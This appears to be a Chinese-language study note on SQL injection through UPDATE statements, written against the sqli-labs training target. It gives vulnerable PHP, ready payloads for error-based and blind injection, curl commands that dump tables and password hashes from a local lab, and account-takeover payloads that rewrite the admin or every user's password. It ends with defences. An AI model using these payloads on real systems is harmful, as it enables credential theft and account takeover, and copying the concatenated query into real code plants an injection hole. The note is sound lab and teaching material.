# 08-UPDATE 注入

> 前置：[[04-二次注入|二次注入]]（改密是 UPDATE 注入最典型入口）
>
> sqli-labs 对照：less-17（update 场景原型，注入点在 POST password）、less-24 第二阶段

## 一、update 语句结构与闭合

标准改密 SQL：

```sql
UPDATE users SET password='新密码' WHERE username='当前用户'
```

对应漏洞代码（less-17 原型）：

```php
$uname = check_input($_POST['uname']);        // 用户名被严格校验
$passwd = $_POST['passwd'];                   // 密码原样拼接 ← 注入点
$sql = "UPDATE users SET password='$passwd' WHERE username='$uname'";
mysql_query($sql);
```

与 select 的区别：**UPDATE 没有结果集回显**，union 同样无处安放；且 UPDATE 会真实修改数据，payload 必须保证语法完整，否则整条语句失败、什么都改不了。主打报错注入与盲注。

## 二、注入点在 SET 与 WHERE 的不同打法

### 注入点在 SET 值（如上例）

闭合 SET 的字符串后，剩余的 `WHERE username='...'` 部分必须保持合法——不能简单 `#` 截断后再乱写。两种思路：

```sql
-- 思路一: 补全结构再注释
新密码值填: ' or updatexml(1,concat(0x7e,database()),1) or '
拼出: UPDATE users SET password='' or updatexml(...) or '' WHERE username='xxx'
      → 表达式合法，报错回显触发

-- 思路二: 直接截断
新密码值填: xxx', admin='hacked
拼出: UPDATE users SET password='xxx', admin='hacked' WHERE ...
      → 多列更新型 payload，可篡改任意其他字段
```

### 注入点在 WHERE 条件

```php
$sql = "UPDATE users SET password='$pass' WHERE username='$username'";
```

WHERE 位置可以自由构造条件甚至子查询：

```sql
-- 报错带数据
username 填: ' and updatexml(1,concat(0x7e,database()),1)#
拼出: ... WHERE username='' and updatexml(...)#'   ← # 截断尾部引号，合法

-- 时间盲注
username 填: ' or if(ascii(substr(database(),1,1))=115,sleep(5),0)#
```

### 两种位置对比

| 对比项 | 注入点在 SET | 注入点在 WHERE |
|--------|-------------|---------------|
| 截断自由度 | 低——必须保住 WHERE 部分语法 | 高——尾部可直接 `#` 注释 |
| 副作用 | 可能意外改写其他字段 | 可能全表更新 |
| payload 风格 | 补全式为主 | 经典 select 式 payload 几乎通用 |
| 判断技巧 | 页面提示"修改成功"与否差异 | 同左 |

### 子查询提数据的通用模板

无论 SET 还是 WHERE 位置，报错子查询模板一致：

```sql
(select group_concat(table_name) from information_schema.tables where table_schema=database())
(select group_concat(column_name) from information_schema.columns where table_name='users' limit 0,1)
(select group_concat(username,0x3a,password) from users)
-- 套壳: ' or updatexml(1,concat(0x7e,(上面的子查询)),1) or '
```

## 三、报错注入提取数据（updatexml 放入 SET 值）

完整流程示例：

```bash
# less-17: 用户名固定 admin，密码框为注入点
curl -s "http://127.0.0.1/sqli-labs/Less-17/" \
     -d "uname=admin&passwd=' or updatexml(1,concat(0x7e,database()),1) or '&submit=Submit"
# XPATH syntax error: '~security'

# 爆表
curl -s "http://127.0.0.1/sqli-labs/Less-17/" \
     -d "uname=admin&passwd=' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) or '&submit=Submit"

# 爆数据（分段防超长截断）
curl -s "http://127.0.0.1/sqli-labs/Less-17/" \
     -d "uname=admin&passwd=' or updatexml(1,concat(0x7e,substr((select group_concat(username,0x3a,password) from users),1,30)),1) or '&submit=Submit"
```

## 四、修改他人密码逻辑漏洞

UPDATE + WHERE 组合的经典越权写法。假设注入点在 username（或经 [[04-二次注入|二次注入]] 落到此处）：

```sql
-- 输入: ' or '1'='1
UPDATE users SET password='我的新密码' WHERE username='' or '1'='1'
-- WHERE 恒真 → 全表所有用户密码被改成同一个值！

-- 更精准的定向接管:
-- 输入: admin'# （配合二次注入链路）
UPDATE users SET password='攻击者密码' WHERE username='admin'#'
-- 只改真实 admin 的密码 → 完成账号接管
```

| payload | 效果 |
|---------|------|
| `' or '1'='1` | 全表更新（破坏性大，CTF 中慎用，可能毁靶场） |
| `admin'#` | 定向接管 admin |
| `admin'-- -` | 同上 |
| `' and 1=2#` | 不更新任何行（用于验证注入存在性） |

### 越权链路：从注入到账号接管

```mermaid
flowchart LR
    A[发现 UPDATE 注入点] --> B[构造定向 WHERE<br/>username='admin'#]
    B --> C[提交改密请求<br/>实际更新 admin 的密码]
    C --> D[用 admin + 新密码登录]
    D --> E[进入管理员后台<br/>完成水平/垂直越权]
```

这条链路在真实业务里对应"改密接口信任客户端传入的用户名"类缺陷，CTF 与实战中都是高频得分点。

## 五、UPDATE 盲注

无报错回显时的两条侧信道：

```sql
-- 时间盲注（SET 或 WHERE 位置均可）
' or if(substr(database(),1,1)='s',sleep(5),0) or '

-- 行数差异盲注: 观察受影响行数/页面提示"密码已修改"与否
' or (select if(length(database())=8,1,0)) or '
-- length 匹配时语句成功执行返回"修改成功"，不匹配时语法仍成立但可加致命条件使其失败
```

注意时间盲注在 UPDATE 上要小心：sleep 放在 WHERE 恒真处会让每行都延迟，大表上会拖死数据库，测试环境无所谓，实战需评估。

### UPDATE 与 INSERT 场景的通用差异表

| 对比项 | INSERT（[[02-UA注入\|02]]） | UPDATE（本章） |
|--------|---------------------------|----------------|
| 结果集回显 | 无 | 无 |
| 副作用 | 新增脏数据一行 | **修改现有数据，破坏性更大** |
| 截断自由度 | 需补齐括号列数 | SET 位置需保结构，WHERE 位置可自由截断 |
| 盲注侧信道 | 页面是否报错 | 受影响行数 / 成功提示差异 |
| payload 模板 | `VALUES` 内闭合补全 | `' or expr or '` 补全式最稳 |

## 六、易错点

| 易错点 | 说明 |
|-------|------|
| 尝试 union | UPDATE 无结果集，union 不可用 |
| payload 破坏 SQL 导致静默失败 | 语句报错时 mysql_query 返回 false 且可能不打印错误，误以为没注入；先打一个确定会报错的 payload 校准 |
| `or '1'='1` 全表更新毁库 | 靶场里会把所有用户密码改掉导致后续关卡异常，先备份数据库 |
| 忘记 less-17 有前置校验 | uname 被 check_input 过滤，注入点只能在 passwd |
| 引号不配对 | UPDATE 对语法完整性要求高，`or '` 结尾补齐比直接截断更稳 |

## 七、防御

| 措施 | 说明 |
|------|------|
| 参数化查询 | prepared statement 绑定 SET 值与 WHERE 条件，根治 |
| 独立校验每一层 | 改密接口对旧密码独立校验、按 session 主键定位用户，不从输入推断目标行 |
| 按 id 而非 username 更新 | `UPDATE users SET password=? WHERE id=?`，杜绝 OR 1=1 波及 |
| 受影响行数监控 | UPDATE 影响行数异常（如超过 1）即告警回滚 |
| 数据库账号最小权限 | 应用账号只授予必要表的必要操作 |

---
**返回** [[mysql结构总目录|mysql结构 总目录]]
